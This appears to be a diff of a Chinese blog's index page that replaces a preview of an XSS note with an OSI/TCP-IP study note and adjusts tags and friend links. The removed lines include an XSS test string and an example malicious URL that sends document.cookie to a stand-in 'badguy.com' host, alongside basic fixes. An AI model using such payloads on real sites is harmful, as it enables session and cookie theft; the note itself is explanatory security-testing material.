@@ -181,19 +181,19 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-OSI七层模型结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+      <a class="article-title" href="/blog/2018/06/12/OSI七层模型结构/">OSI七层模型结构, TCP/IP四层模型学习笔记</a>
     </h1>
   
 
         
-        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
+        <a href="/blog/2018/06/12/OSI七层模型结构/" class="archive-article-date">
   	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
 </a>
         
@@ -201,15 +201,13 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><pre><code>1. 在input标签中输入 `&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-`,因此输入的字符被浏览器解析成js代码执行
-2. 恶意URL`http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;`
-</code></pre><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><pre><code>1. 将用户输入的字符进行HTML Encode转码
-2. input输入框只允许输入规定的字符
-</code></pre><h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2><pre><code>1. 在input标签中输入 `&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-`
-2. 高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器
+        <h1 id="OSI七层和TCP-IP四层的关系"><a href="#OSI七层和TCP-IP四层的关系" class="headerlink" title="OSI七层和TCP/IP四层的关系"></a>OSI七层和TCP/IP四层的关系</h1><pre><code>1. TCP/IP先有协议再提出的模型,是参照OSI模型
+2. OSI是理论下的模型,而TCP/IP已被广泛使用
+3. TCP transmission control protocol 传输控制协议
+4. UDP user data protocol 用户数据报协议
 </code></pre>
         
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/#more">more >></a>
+          <a class="article-more-a" href="/blog/2018/06/12/OSI七层模型结构/#more">more >></a>
         
       
 
@@ -223,11 +221,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">OSI</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">TCP/IP</a>
         		</li>
       		
 		</ul>
@@ -239,7 +237,7 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        			<a href="/blog/categories/网络//" class="article-tag-list-link color3">网络</a>
         		</li>
       		
 		</ul>
@@ -248,7 +246,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
+          <a class="article-more-a" href="/blog/2018/06/12/OSI七层模型结构/">展开全文 >></a>
         </p>
       
 
@@ -866,7 +864,7 @@ var _hmt = _hmt || [];
 		toc_hide_index: true,
 		root: "/blog/",
 		innerArchive: true,
-		showTags: false
+		showTags: true
 	}
 </script>
 
@@ -956,15 +954,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">OSI</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">TCP/IP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1042,6 +1040,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     	<section class="tools-section tools-section-friends" q-show="friends">
   		
         <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://www.ruanyifeng.com/blog/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>阮一峰</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://www.liaoxuefeng.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>廖雪峰</a>
+            </li>
           
             <li class="search-li">
               <a href="https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&mid=2247484081&idx=1&sn=5ea6ecbcbd41c2cc0b948adf6888f60b&chksm=ebd743b0dca0caa68db0ed08a710506d60e129c8d64508c5ce1e123eafb5eaabdf35fbbed28b#rd" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>排序方法</a>
